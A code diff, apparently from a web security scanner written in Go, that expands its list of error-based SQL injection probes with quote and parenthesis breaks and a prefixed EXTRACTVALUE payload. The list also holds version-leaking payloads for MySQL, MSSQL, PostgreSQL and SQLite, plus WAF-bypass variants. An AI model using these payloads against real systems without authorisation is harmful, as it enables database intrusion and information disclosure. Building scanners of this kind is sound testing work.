@@ -15,14 +15,18 @@ var SQLiBooleanProbes = []string{
 }
 
 // SQLiErrorProbes are error-based probes covering major DBMS families.
-// What: ten non-destructive probes (no DROP/DELETE/write), each crafted so
-// the resulting error, when echoed, matches an error-oracle signature:
+// What: fourteen non-destructive probes (no DROP/DELETE/write), each crafted
+// so the resulting error, when echoed, matches an error-oracle signature:
 // MySQL (EXTRACTVALUE/UPDATEXML XPATH), MSSQL (CONVERT int), PostgreSQL
-// (CAST VERSION), SQLite (cast sqlite_version), plus case-mixing and
-// double-encoding/tab/versioned-comment WAF bypass variants.
+// (CAST VERSION), SQLite (cast sqlite_version), plus prefix-preserving
+// quote/paren breaks for values concatenated after a numeric id, and
+// case-mixing/double-encoding/tab/versioned-comment WAF bypass variants.
 // Why: one corpus shared by the Go engine and the Tier 2 JS plugin keeps
 // live fuzzing and fixture-tested plugin behavior in lockstep.
 var SQLiErrorProbes = []string{
+	"1'",
+	"1\"",
+	"1)",
 	"AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
 	"AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
 	"AND 1=CONVERT(int,@@version)",
@@ -33,6 +37,7 @@ var SQLiErrorProbes = []string{
 	"%2527%2520AND%25201=1--%2520",
 	"'%09AND%09/**/1=1--",
 	"/*!50000AND*/ 1=1--",
+	"1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
 }
 
 // SQLiProbes returns the full ordered corpus: boolean pair first (cheapest
